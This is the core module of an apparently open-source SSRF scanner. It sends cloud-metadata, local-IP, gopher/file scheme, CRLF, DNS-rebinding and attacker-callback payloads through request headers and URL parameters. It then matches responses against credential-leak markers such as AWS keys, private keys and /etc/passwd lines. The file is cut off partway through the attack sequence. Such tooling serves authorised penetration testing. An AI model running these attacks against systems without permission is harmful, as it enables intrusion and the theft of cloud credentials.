"""Core SSRF scanner: orchestration, attack phases and detection."""

import asyncio
import base64
import csv
import json
import logging
import os
import threading
import time
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional
from urllib.parse import (
    urlparse,
    quote,
    unquote,
    parse_qsl,
    urlencode,
    urlunparse,
)

import aiohttp
from aiohttp import ClientTimeout
from colorama import Fore

from .banner import printBanner
from .config import Config
from .models import ScanResult
from .networking import RequestManager
from .payloads import PayloadGenerator, ProtocolHandler
from .progress import ScanProgress
from .reporting import Reporter
from .throttling import ErrorHandler, SmartThrottler


class SSRFScanner:
    def __init__(self):
        printBanner()
        
        # Initialize configuration
        self.config = Config()
        
        # Initialize components
        self.request_manager = RequestManager(self.config)
        self.error_handler = ErrorHandler()
        self.throttler = SmartThrottler()
        self.payload_generator = PayloadGenerator()
        self.protocol_handler = ProtocolHandler()
        
        # Static headers applied to all requests (set via -H/--header)
        self.static_headers = {}
        
        # Initialize async primitives
        self.semaphore = None  # Will be created in async context
        self.lock = None  # Async lock, created in async context
        self.file_lock = None  # Threading lock for file I/O
        
        # Setup logging first
        self.setup_logging()
        
        # Initialize payload lists
        self.local_ips = []
        self.headers = []
        self.cloud_metadata = []
        self.protocols = []
        self.encoded_payloads = []
        self.parameter_payloads = []
        self.port_payloads = []
        self.dns_rebinding = []
        self.crlf_injection = []
        self.scheme_confusion = []
        
        # Initialize counters and settings
        self.nrTotUrls = 0
        self.nrUrlsAnalyzed = 0
        self.nrErrorUrl = 0
        self.backurl = ""
        self.cookies = None
        self.quiet_mode = False
        
        # Request tracking
        self.total_requests_attempted = 0
        self.total_requests_succeeded = 0
        self.total_requests_failed = 0
        self.failure_reasons = {}
        self.response_codes = {}  # Track response codes
        self.scan_start_time = None
        
        # Initialize progress tracking
        self.progress = ScanProgress()
        
        # Setup output
        self.output_filename = datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p")
        self.setup_output_files()
        
        # Load payloads last
        self.load_all_payloads()
        
        # Initialize reporter (will be updated with format in run())
        self.reporter = None


    def setup_logging(self):
        """Setup logging configuration"""
        logging.basicConfig(
            level=logging.INFO if not self.config.scanner['debug'] else logging.DEBUG,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger('ssrf_scanner')

    def setup_output_files(self):
        """Setup output directory and files"""
        self.output_dir = f"output/{self.output_filename}"
        os.makedirs(self.output_dir, exist_ok=True)
        self.txt_output = f"{self.output_dir}/scan.txt"
        self.csv_output = f"{self.output_dir}/scan.csv"
        self.json_output = f"{self.output_dir}/scan.json"

    def load_all_payloads(self):
        """Load all payload files from the payloads directory"""
        payload_dir = "payloads"
        
        # Create payloads directory if it doesn't exist
        if not os.path.exists(payload_dir):
            os.makedirs(payload_dir)
            self.logger.warning(f"Created {payload_dir} directory")
        
        payload_files = {
            'local_ips.txt': self.local_ips,
            'headers.txt': self.headers,
            'cloud_metadata.txt': self.cloud_metadata,
            'protocols.txt': self.protocols,
            'encoded_payloads.txt': self.encoded_payloads,
            'parameter_payloads.txt': self.parameter_payloads,
            'port_payloads.txt': self.port_payloads,
            'dns_rebinding.txt': self.dns_rebinding,
            'crlf_injection.txt': self.crlf_injection,
            'scheme_confusion.txt': self.scheme_confusion
        }

        for filename, payload_list in payload_files.items():
            filepath = os.path.join(payload_dir, filename)
            try:
                if not os.path.exists(filepath):
                    # Create empty file if it doesn't exist
                    with open(filepath, 'w') as f:
                        f.write("# Add your payloads here\n")
                    self.logger.warning(f"Created empty payload file: {filename}")
                else:
                    with open(filepath, 'r') as f:
                        payload_list.extend([line.strip() for line in f if line.strip() and not line.startswith('#')])
                        self.logger.info(f"Loaded {len(payload_list)} payloads from {filename}")
            except Exception as e:
                self.logger.error(f"Error processing {filename}: {str(e)}")

    async def make_request(self, url, method='GET', headers=None, timeout=None):
        """Async request method with rate limiting and error handling"""
        try:
            default_headers = {
                'User-Agent': self.config.scanner['user_agent'],
                'Accept': '*/*'
            }

            # Apply static headers set from CLI (-H/--header), e.g. Authorization
            if hasattr(self, "static_headers") and self.static_headers:
                default_headers.update(self.static_headers)            
           
            if headers:
                default_headers.update(headers)

            if self.cookies:
                if isinstance(self.cookies, str):
                    default_headers['Cookie'] = self.cookies
                elif isinstance(self.cookies, dict):
                    default_headers['Cookie'] = '; '.join([f'{k}={v}' for k, v in self.cookies.items()])

            # Prepare request kwargs
            request_kwargs = {
                'method': method,
                'url': url,
                'headers': default_headers,
                'timeout': ClientTimeout(total=timeout or self.config.scanner['timeout']),
                'ssl': False if not self.config.scanner['verify_ssl'] else None,
                'allow_redirects': self.config.scanner['follow_redirects']
            }
            
            # Add proxy if configured
            if self.config.scanner.get('proxy'):
                request_kwargs['proxy'] = self.config.scanner['proxy']
                if self.config.scanner.get('proxy_auth'):
                    auth_parts = self.config.scanner['proxy_auth'].split(':')
                    if len(auth_parts) == 2:
                        request_kwargs['proxy_auth'] = aiohttp.BasicAuth(auth_parts[0], auth_parts[1])

            self.total_requests_attempted += 1
            
            async with self.semaphore:
                # Rate limiting: block until a token is available so we honor
                # the configured --rate-limit (and adaptive backoff on errors).
                await self.throttler.pre_request()

                request_start = time.perf_counter()
                async with self.request_manager.session.request(**request_kwargs) as response:
                    # Read response body
                    body = await response.read()
                    elapsed_seconds = time.perf_counter() - request_start

                    # Feed the throttler so it can adapt the rate on success
                    await self.throttler.post_request(success=True)

                    # Track successful request
                    self.total_requests_succeeded += 1
                    
                    # Track response code
                    status_code = response.status
                    self.response_codes[status_code] = self.response_codes.get(status_code, 0) + 1
                    
                    # Update progress every 10 successful requests
                    if self.total_requests_succeeded % 10 == 0:
                        self.print_progress()
                    
                    # Check for Set-Cookie header
                    if self.config.scanner['capture_cookies'] and 'Set-Cookie' in response.headers and not self.cookies:
                        self.cookies = response.headers['Set-Cookie']
                        if self.config.scanner['debug']:
                            self.logger.info(f"Captured cookies from response")

                    # Create a response-like object with necessary attributes
                    class ResponseWrapper:
                        def __init__(self, status, headers, body, url, elapsed):
                            self.status_code = status
                            self.headers = headers
                            self.content = body
                            self.text = body.decode('utf-8', errors='ignore')
                            self.url = url
                            # timedelta so callers can use .total_seconds()
                            self.elapsed = timedelta(seconds=elapsed)

                    return ResponseWrapper(response.status, response.headers, body, url, elapsed_seconds)
            
        except asyncio.TimeoutError:
            self.total_requests_failed += 1
            self.failure_reasons['timeout'] = self.failure_reasons.get('timeout', 0) + 1
            # Let the throttler adapt (slow down) after a failure
            await self.throttler.post_request(success=False)
            # Update progress on failures too
            if self.total_requests_failed % 50 == 0:
                self.print_progress()
            if self.config.scanner['debug']:
                self.logger.error(f"Timeout for {url}")
            return None
        except aiohttp.ClientError as e:
            self.total_requests_failed += 1
            error_type = type(e).__name__
            self.failure_reasons[error_type] = self.failure_reasons.get(error_type, 0) + 1
            # Let the throttler adapt (slow down) after a failure
            await self.throttler.post_request(success=False)
            # Update progress on failures too
            if self.total_requests_failed % 50 == 0:
                self.print_progress()
            if self.config.scanner['debug']:
                self.logger.error(f"Client error for {url}: {str(e)}")
            return None
        except Exception as e:
            self.total_requests_failed += 1
            error_type = type(e).__name__
            self.failure_reasons[error_type] = self.failure_reasons.get(error_type, 0) + 1
            # Let the throttler adapt (slow down) after a failure
            await self.throttler.post_request(success=False)
            # Update progress on failures too
            if self.total_requests_failed % 50 == 0:
                self.print_progress()
            if self.config.scanner['debug']:
                self.logger.error(f"Request failed for {url}: {error_type}: {str(e)}")
            return None


    def analyze_response(self, original_response, test_response):
        """Analyze differences between original and test responses with smart detection"""
        if not test_response:
            return False, {}

        # Don't flag rate limiting as vulnerability
        if test_response.status_code == 429:
            return False, {}

        # Basic differences
        differences = {
            'status_code_changed': original_response.status_code != test_response.status_code,
            'content_length': len(original_response.content) != len(test_response.content),
            'content_type': original_response.headers.get('content-type') != 
                          test_response.headers.get('content-type'),
            'word_count': len(original_response.text.split()) != 
                         len(test_response.text.split())
        }
        
        # Use baseline if available for smarter detection
        if hasattr(self, 'baseline') and self.baseline:
            # Check if status code differs from baseline (HIGH PRIORITY)
            # But ignore rate limiting
            if test_response.status_code not in self.baseline['status_codes'] and test_response.status_code != 429:
                differences['unexpected_status'] = True
                differences['baseline_status'] = list(self.baseline['status_codes'])
                differences['test_status'] = test_response.status_code
                # Status code change is always significant
                return True, differences
            
            # If baseline is stable and response differs significantly, it's interesting
            if self.baseline['stable']:
                length_diff = abs(len(test_response.content) - self.baseline['avg_length'])
                # Flag if difference is > 10% of baseline
                if length_diff > self.baseline['avg_length'] * 0.1:
                    differences['significant_size_change'] = True
                    differences['size_diff_percent'] = (length_diff / self.baseline['avg_length']) * 100
        else:
            # No baseline - use original response for comparison
            if differences['status_code_changed']:
                differences['unexpected_status'] = True
                differences['baseline_status'] = [original_response.status_code]
                differences['test_status'] = test_response.status_code
                return True, differences
        
        # Look for SSRF indicators in response.
        #
        # These are intentionally anchored/high-signal byte sequences. Loose
        # substrings like b'token', b'secret', b'private' or b'AWS' match huge
        # numbers of ordinary pages (CSRF tokens, privacy notices, docs) and
        # produced excessive false positives, so they were replaced with
        # patterns that only appear when internal data is actually exfiltrated.
        ssrf_indicators = [
            b'root:x:0:0:',                          # /etc/passwd (Linux)
            b'root:*:0:0:',                          # /etc/passwd (BSD/macOS)
            b'<title>Index of',                      # directory listing
            b'-----BEGIN RSA PRIVATE KEY-----',      # private key
            b'-----BEGIN PRIVATE KEY-----',          # private key
            b'-----BEGIN OPENSSH PRIVATE KEY-----',  # OpenSSH private key
            b'ssh-rsa ',                             # public key material
            b'security-credentials',                 # AWS IMDS IAM creds path
            b'"AccessKeyId"',                        # AWS credential document
            b'"SecretAccessKey"',                    # AWS credential document
            b'ami-id',                               # AWS EC2 metadata
            b'instance-identity',                    # AWS EC2 metadata
            b'computeMetadata',                      # GCP metadata
            b'Metadata-Flavor',                      # GCP metadata header echo
        ]
        
        for indicator in ssrf_indicators:
            if indicator in test_response.content:
                differences['ssrf_indicator'] = indicator.decode('utf-8', errors='ignore')
                return True, differences  # Definite hit
        
        # Flag if we have significant differences
        significant_diffs = ['status_code_changed', 'significant_size_change', 'unexpected_status', 'ssrf_indicator']
        has_significant = any(differences.get(k, False) for k in significant_diffs)
        
        # Additional check: if status code matches baseline and no SSRF indicators, not vulnerable
        if hasattr(self, 'baseline') and self.baseline:
            if (test_response.status_code in self.baseline['status_codes'] and 
                'ssrf_indicator' not in differences):
                # Status matches baseline and no suspicious content - likely not vulnerable
                return False, differences
        
        return has_significant, differences

    def print_progress(self):
        """Print scan progress with phase information and percentages"""
        if self.quiet_mode:
            return
            
        # Non-blocking progress print (no lock needed for reading)
        total_progress = self.progress.get_total_progress()
        current_phase = self.progress.current_phase or "Initializing"
        
        # Clear line and move cursor to beginning
        print('\r' + ' ' * 150 + '\r', end='', flush=True)
        
        # Calculate success rate
        success_rate = 0
        if self.total_requests_attempted > 0:
            success_rate = (self.total_requests_succeeded / self.total_requests_attempted) * 100
        
        # Calculate requests per second
        req_per_sec = 0
        if hasattr(self, 'scan_start_time'):
            elapsed = time.time() - self.scan_start_time
            if elapsed > 0:
                req_per_sec = self.total_requests_succeeded / elapsed
        
        # Calculate actual progress based on requests (more accurate than weighted phases)
        estimated_total_requests = 28300  # Approximate total for all phases
        actual_progress = (self.total_requests_attempted / estimated_total_requests * 100) if estimated_total_requests > 0 else 0
        actual_progress = min(actual_progress, 100)
        
        # Print progress information with request stats
        print(f"URLs: {self.nrUrlsAnalyzed}/{self.nrTotUrls} | "
              f"Requests: {self.total_requests_succeeded:,}/{self.total_requests_attempted:,} "
              f"({req_per_sec:.1f} req/s) | "
              f"Phase: {current_phase} | "
              f"Progress: {actual_progress:.1f}%", end='', flush=True)

    def update_progress(self, phase, completed, total):
        """Update progress for a specific phase"""
        progress = (completed / total * 100) if total > 0 else 100
        self.progress.update_phase(phase, progress/100)
        self.print_progress()

    async def perform_attack(self, url: str, attack_type: str, payload: str, headers: Dict[str, str], original_response) -> Optional[ScanResult]:
        """Perform an attack and record the result"""
        try:
            response = await self.make_request(url, headers=headers)
            if not response:
                return None

            is_vulnerable, differences = self.analyze_response(original_response, response)
            
            result = ScanResult(
                url=url,
                attack_type=attack_type,
                payload=payload,
                response_code=response.status_code,
                response_size=len(response.content),
                timestamp=datetime.now(),
                headers=headers,
                is_vulnerable=is_vulnerable,
                notes=str(differences) if differences else ""
            )

            if is_vulnerable:
                result.verification_method = self.verify_vulnerability(url, payload, response, original_response)
                self.reporter.add_result(result)

            return result

        except Exception as e:
            if self.config.scanner['debug']:
                self.logger.error(f"Error performing {attack_type} attack on {url}: {str(e)}")
            return None

    @staticmethod
    def _unique(seq):
        """Return items from seq with duplicates removed, preserving order."""
        seen = set()
        result = []
        for item in seq:
            if item not in seen:
                seen.add(item)
                result.append(item)
        return result

    async def localAttack(self, url, original_response):
        """Enhanced local IP attack with payload generation"""
        base_ips = self.local_ips.copy()

        # Generate IP variations, then their URL-encoding variations, and
        # deduplicate. Both generators emit overlapping quote()/double-quote
        # forms, so building a unique payload set here avoids sending many
        # identical requests (large reduction with no loss of coverage).
        payloads = []
        for ip in base_ips:
            for variation in self.payload_generator.generate_ip_variations(ip):
                payloads.extend(self.payload_generator.generate_url_encodings(variation))
        payloads = self._unique(payloads)

        total_tests = len(self.headers) * len(payloads)
        completed_tests = 0

        tasks = []
        for header in self.headers:
            for payload in payloads:
                badHeader = {header: payload}
                tasks.append(self.perform_attack(url, 'LocalIP', payload, badHeader, original_response))
        
        # Execute all tasks concurrently
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 100 == 0:
                self.update_progress('Local IP', completed_tests, total_tests)

    async def cloudMetadataAttack(self, url, original_response):
        """Enhanced cloud metadata attack with payload variations"""
        # Build a deduplicated payload set from all metadata endpoints and
        # their encoding variations before dispatching per header.
        payloads = []
        for metadata_url in self.cloud_metadata:
            payloads.extend(self.payload_generator.generate_url_encodings(metadata_url))
        payloads = self._unique(payloads)

        total_tests = len(self.headers) * len(payloads)
        completed_tests = 0

        tasks = []
        for header in self.headers:
            for payload in payloads:
                badHeader = {header: payload}
                tasks.append(self.perform_attack(url, 'CloudMetadata', payload, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 50 == 0:
                self.update_progress('Cloud Metadata', completed_tests, total_tests)

    async def protocolAttack(self, url, original_response):
        """Enhanced protocol attack with protocol-specific handlers"""
        total_tests = len(self.headers) * len(self.protocols) * min(len(self.local_ips), 5)
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for protocol in self.protocols:
                for ip in self.local_ips[:5]:
                    # Get protocol-specific payloads
                    if protocol == 'gopher://':
                        payloads = self.protocol_handler.handle_gopher(ip)
                    elif protocol == 'dict://':
                        payloads = self.protocol_handler.handle_dict(ip)
                    elif protocol == 'file://':
                        payloads = self.protocol_handler.handle_file(ip)
                    else:
                        payloads = self.payload_generator.generate_protocol_variations(protocol, ip)
                    
                    for payload in payloads:
                        badHeader = {header: payload}
                        tasks.append(self.perform_attack(url, 'Protocol', payload, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 50 == 0:
                self.update_progress('Protocol', completed_tests, total_tests)

    async def encodedAttack(self, url, original_response):
        """Enhanced encoded attack with multiple encoding variations"""
        # Build a deduplicated set of encoded payloads. Some encodings collapse
        # to the base payload (e.g. when it contains no '.' or '/'), so dedup
        # trims redundant requests.
        payloads = []
        for base_payload in self.encoded_payloads:
            payloads.extend([
                base_payload,
                quote(base_payload),
                quote(quote(base_payload)),
                base64.b64encode(base_payload.encode()).decode(),
                base_payload.replace('.', '%2e').replace('/', '%2f'),
            ])
        payloads = self._unique(payloads)

        total_tests = len(self.headers) * len(payloads)
        completed_tests = 0

        tasks = []
        for header in self.headers:
            for payload in payloads:
                badHeader = {header: payload}
                tasks.append(self.perform_attack(url, 'Encoded', payload, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 50 == 0:
                self.update_progress('Encoded', completed_tests, total_tests)

    async def parameterAttack(self, url, original_response):
        """Perform SSRF attack using parameter injection"""
        total_tests = len(self.parameter_payloads)
        completed_tests = 0
        
        tasks = []
        for param in self.parameter_payloads:
            if '?' in url:
                test_url = f"{url}&{param}"
            else:
                test_url = f"{url}?{param}"
            
            tasks.append(self.make_request(test_url))
        
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        for param, response in zip(self.parameter_payloads, responses):
            completed_tests += 1
            if completed_tests % 20 == 0:
                self.update_progress('Parameter', completed_tests, total_tests)
            
            if response and not isinstance(response, Exception):
                is_vulnerable, differences = self.analyze_response(original_response, response)
                if is_vulnerable:
                    result = ScanResult(
                        url=url,
                        attack_type='Parameter',
                        payload=param,
                        response_code=response.status_code,
                        response_size=len(response.content),
                        timestamp=datetime.now(),
                        headers={},
                        is_vulnerable=True,
                        notes=str(differences)
                    )
                    self.log_vulnerability(result)

    async def parameterCallbackAttack(self, url, original_response):
        """
        For URLs that already have query parameters, replace each parameter's value
        with SSRF callback-style payloads (Burp Collaborator / backurl variations).
        """
        # Parse URL and check for existing query params
        parsed = urlparse(url)
        if not parsed.query:
            # No parameters to replace, nothing to do
            return

        # Original query params as list of (name, value) pairs
        query_pairs = parse_qsl(parsed.query, keep_blank_values=True)

        # Build callback-style payloads:
        #  - Variations based on self.backurl (if provided)
        #  - DNS rebinding payloads (with <BURP-COLLABORATOR> replaced when possible)
        callback_payloads = []

        # backurl-based variations (same idea as remoteAttack)
        if self.backurl:
            callback_payloads.extend([
                self.backurl,
                f"http://{self.backurl}",
                f"https://{self.backurl}",
                f"{self.backurl}/ssrf-test",
                f"{self.backurl}?callback=true",
                f"http://{self.backurl}:80",
                f"http://{self.backurl}:443",
                f"http://{self.backurl}:8080",
                quote(f"http://{self.backurl}"),
                quote(quote(f"http://{self.backurl}")),
            ])

        # DNS rebinding payloads (same semantics as dnsRebindingAttack)
        for dns in self.dns_rebinding:
            payload = dns
            if '<BURP-COLLABORATOR>' in dns and self.backurl:
                payload = dns.replace('<BURP-COLLABORATOR>', self.backurl)
            callback_payloads.append(payload)

        # Deduplicate while preserving order
        callback_payloads = list(dict.fromkeys(callback_payloads))

        if not callback_payloads:
            # Nothing to inject
            return

        total_tests = len(query_pairs) * len(callback_payloads)
        completed_tests = 0

        tasks = []
        meta = []  # (param_name, payload, test_url)

        # For each parameter, create variants where its value is replaced
        for idx, (name, value) in enumerate(query_pairs):
            for payload in callback_payloads:
                # Create a new list of query params with this one modified
                new_pairs = [
                    (n, payload if i == idx else v)
                    for i, (n, v) in enumerate(query_pairs)
                ]
                new_query = urlencode(new_pairs, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))

                tasks.append(self.make_request(new_url))
                meta.append((name, payload, new_url))

        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for (param_name, payload, test_url), response in zip(meta, responses):
            completed_tests += 1
            # Re-use "Parameter" phase for progress
            if completed_tests % 20 == 0:
                self.update_progress('Parameter', completed_tests, total_tests)

            if not response or isinstance(response, Exception):
                continue

            is_vulnerable, differences = self.analyze_response(original_response, response)
            if is_vulnerable:
                # Record the finding
                result = ScanResult(
                    url=test_url,
                    attack_type='ParameterCallback',
                    payload=f"{param_name}={payload}",
                    response_code=response.status_code,
                    response_size=len(response.content),
                    timestamp=datetime.now(),
                    headers={},  # this attack is URL-parameter-based
                    is_vulnerable=True,
                    notes=str(differences)
                )
                # Try to verify with existing verification logic
                result.verification_method = self.verify_vulnerability(
                    test_url,
                    payload,
                    response,
                    original_response
                )
                # Log + report
                self.log_vulnerability(result)
                if self.reporter:
                    self.reporter.add_result(result)

    async def portScanAttack(self, url, original_response):
        """Perform SSRF port scan attack"""
        total_tests = len(self.headers) * len(self.port_payloads) * min(len(self.local_ips), 5)
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for port in self.port_payloads:
                for ip in self.local_ips[:5]:
                    payload = f"{ip}{port}"
                    badHeader = {header: payload}
                    tasks.append(self.perform_attack(url, 'PortScan', payload, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 50 == 0:
                self.update_progress('Port Scan', completed_tests, total_tests)

    async def dnsRebindingAttack(self, url, original_response):
        """Perform DNS rebinding attack"""
        total_tests = len(self.headers) * len(self.dns_rebinding)
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for dns in self.dns_rebinding:
                payload = dns
                if '<BURP-COLLABORATOR>' in dns and self.backurl:
                    payload = dns.replace('<BURP-COLLABORATOR>', self.backurl)
                
                badHeader = {header: payload}
                tasks.append(self.perform_attack(url, 'DNSRebinding', payload, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 20 == 0:
                self.update_progress('DNS Rebinding', completed_tests, total_tests)

    async def remoteAttack(self, url, original_response):
        """Perform remote SSRF attack using callback URL"""
        if not self.backurl:
            return
        
        # Generate various callback URL formats
        callback_variations = [
            self.backurl,
            f"http://{self.backurl}",
            f"https://{self.backurl}",
            f"{self.backurl}/ssrf-test",
            f"{self.backurl}?callback=true",
            f"http://{self.backurl}:80",
            f"http://{self.backurl}:443",
            f"http://{self.backurl}:8080",
            quote(f"http://{self.backurl}"),
            quote(quote(f"http://{self.backurl}")),
        ]
        
        total_tests = len(self.headers) * len(callback_variations)
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for callback in callback_variations:
                badHeader = {header: callback}
                tasks.append(self.perform_attack(url, 'Remote', callback, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 20 == 0:
                self.update_progress('Remote', completed_tests, total_tests)

    async def crlfInjectionAttack(self, url, original_response):
        """Perform CRLF injection attack to manipulate HTTP requests"""
        # Calculate actual total: 2 tasks per (header × crlf × ip)
        total_tests = len(self.headers) * len(self.crlf_injection) * min(len(self.local_ips), 3) * 2
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for crlf_payload in self.crlf_injection:
                # Test CRLF with local IPs
                for ip in self.local_ips[:3]:
                    # Inject CRLF before the IP
                    payload = f"{ip}{crlf_payload}"
                    badHeader = {header: payload}
                    tasks.append(self.perform_attack(url, 'CRLF_Injection', payload, badHeader, original_response))
                    
                    # Also test CRLF after protocol
                    payload_with_protocol = f"http://{ip}{crlf_payload}"
                    badHeader = {header: payload_with_protocol}
                    tasks.append(self.perform_attack(url, 'CRLF_Injection', payload_with_protocol, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 50 == 0:
                self.update_progress('CRLF Injection', completed_tests, total_tests)

    async def schemeConfusionAttack(self, url, original_response):
        """Perform scheme confusion attack using alternative protocols"""
        # Combine scheme_confusion payloads with existing protocols
        all_schemes = self.scheme_confusion.copy()
        
        # Also test protocols.txt with local IPs
        for protocol in self.protocols:
            for ip in self.local_ips[:5]:
                all_schemes.append(f"{protocol}{ip}")

        # Remove any duplicate scheme payloads before dispatch
        all_schemes = self._unique(all_schemes)

        total_tests = len(self.headers) * len(all_schemes)
        completed_tests = 0
        
        tasks = []
        for header in self.headers:
            for scheme_payload in all_schemes:
                badHeader = {header: scheme_payload}
                tasks.append(self.perform_attack(url, 'Scheme_Confusion', scheme_payload, badHeader, original_response))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, ScanResult) and result.is_vulnerable:
                self.log_vulnerability(result)
            completed_tests += 1
            if completed_tests % 50 == 0:
                self.update_progress('Scheme Confusion', completed_tests, total_tests)

    def verify_vulnerability(self, url: str, payload: str, response, original_response=None) -> str:
        """Verify if the potential vulnerability is real"""
        # Pass original_response to verification methods that need it
        verification_methods = [
            lambda r: self._verify_response_code(r, original_response),
            self._verify_response_content,
            self._verify_response_headers,
            self._verify_timing_difference
        ]

        for i, method in enumerate(verification_methods):
            try:
                if method(response):
                    # Return the actual method name for the first one
                    if i == 0:
                        return "_verify_response_code"
                    else:
                        return method.__name__
            except:
                continue
        return "unverified"

    def _verify_response_code(self, response, original_response=None) -> bool:
        """Verify vulnerability based on response code"""
        # Don't flag rate limiting as vulnerability
        if response.status_code == 429:
            return False
        
        # If we have original response, only flag if status changed
        if original_response:
            # Check against baseline if available
            if hasattr(self, 'baseline') and self.baseline:
                # Only flag if status is NOT in baseline
                return response.status_code not in self.baseline['status_codes']
            else:
                # No baseline - check if different from original
                return response.status_code != original_response.status_code
        
        # Fallback: flag common success codes (but this shouldn't happen)
        return response.status_code in [200, 301, 302, 307]

    def _verify_response_content(self, response) -> bool:
        """Verify vulnerability based on response content"""
        # Don't flag rate limiting as vulnerability
        if response.status_code == 429:
            return False
            
        # Anchored, high-signal markers only. Generic words such as 'key',
        # 'password', 'internal', 'aws' or 'secret' appear on countless normal
        # pages and caused false positives; these patterns indicate that
        # internal/credential data was actually returned.
        indicators = [
            'root:x:0:0:',
            'root:*:0:0:',
            'security-credentials',
            '"accesskeyid"',
            '"secretaccesskey"',
            'ami-id',
            'instance-identity',
            'computemetadata',
            'metadata-flavor',
            'begin rsa private key',
            'begin private key',
            'begin openssh private key',
            'uid=0(root)',
        ]
        text = response.text.lower()
        return any(indicator in text for indicator in indicators)

    def _verify_response_headers(self, response) -> bool:
        """Verify vulnerability based on response headers"""
        suspicious_headers = [
            'x-internal',
            'server-internal',
            'x-backend-server',
            'x-upstream',
            'x-host',
            'x-forwarded-server'
        ]
        return any(header.lower() in response.headers for header in suspicious_headers)

    def _verify_timing_difference(self, response) -> bool:
        """Verify vulnerability based on response timing"""
        return response.elapsed.total_seconds() > 2.0

    def log_vulnerability(self, result: ScanResult):
        """Log detected vulnerability"""
        with self.file_lock:
            # Rename verification method names for output
            verification_name = result.verification_method
            if verification_name == "_verify_response_code":
                verification_name = "Response Code Analysis"
            elif verification_name == "_verify_response_content":
                verification_name = "Response Content Analysis"
            elif verification_name == "_verify_response_headers":
                verification_name = "Response Headers Analysis"
            elif verification_name == "_verify_timing_difference":
                verification_name = "Timing Analysis"
            
            self.logger.warning(f"\nPotential SSRF vulnerability found!")
            self.logger.warning(f"URL: {result.url}")
            self.logger.warning(f"Attack Type: {result.attack_type}")
            self.logger.warning(f"Payload: {result.payload}")
            self.logger.warning(f"Response Code: {result.response_code}")
            self.logger.warning(f"Verification Method: {verification_name}")
            self.logger.warning("-" * 50)

    def checkIfLogResult(self, original_response, response, tempResponses, logInfo):
        """Check if response should be logged"""
        is_different, differences = self.analyze_response(original_response, response)
        
        if is_different:
            response_code = str(response.status_code)
            response_size = str(len(response.content))
            
            if response_code not in tempResponses:
                tempResponses[response_code] = [response_size]
                logInfo['ResponseCode'] = response_code
                logInfo['ResponseSize'] = response_size
                self.log_result(logInfo)
            elif response_size not in tempResponses[response_code]:
                tempResponses[response_code].append(response_size)
                logInfo['ResponseCode'] = response_code
                logInfo['ResponseSize'] = response_size
                self.log_result(logInfo)

    def log_result(self, info):
        """Log scan results to files"""
        with self.file_lock:
            # Write to CSV
            with open(self.csv_output, 'a', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=info.keys())
                if f.tell() == 0:
                    writer.writeheader()
                writer.writerow(info)
            
            # Write to JSON
            results = []
            if os.path.exists(self.json_output):
                with open(self.json_output, 'r') as f:
                    try:
                        results = json.load(f)
                    except json.JSONDecodeError:
                        results = []
            
            results.append(info)
            with open(self.json_output, 'w') as f:
                json.dump(results, f, indent=2)
            
            # Write to TXT
            with open(self.txt_output, 'a') as f:
                f.write(f"\nPotential SSRF Found!\n")
                f.write(f"URL: {info['Hostname']}\n")
                f.write(f"Attack Type: {info['AttackType']}\n")
                f.write(f"Header: {info['HeaderField']}\n")
                f.write(f"Payload: {info['HeaderValue']}\n")
                f.write(f"Response Code: {info['ResponseCode']}\n")
                f.write(f"Response Size: {info['ResponseSize']}\n")
                f.write("-" * 50 + "\n")

    async def performAllAttack(self, url, baseline=None):
        """Perform all SSRF attacks"""
        if not self.quiet_mode:
            print(f"[*] Fetching original response from {url}...")
        
        original_response = await self.make_request(url)
        
        if original_response:
            if not self.quiet_mode:
                print(f"[*] Got response (Status: {original_response.status_code}, Size: {len(original_response.content)} bytes)")
                print(f"[*] Starting attack phases...")
            
            # Store baseline for comparison
            self.baseline = baseline
            
            try:
                self.progress.current_phase = "Local IP"
                await self.localAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in Local IP attack: {str(e)}")
            
            try:
                self.progress.current_phase = "Cloud Metadata"
                await self.cloudMetadataAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in Cloud Metadata attack: {str(e)}")
            
            try:
                self.progress.current_phase = "Protocol"
                await self.protocolAttack(url, original_response)
            except Exception as e:
                self.logger.error(f"Error in Protocol attack: {str(e)}")
            
            try:
                self.progress.current_phase = "Encoded"
                await self.encodedAttack(url, original_response)
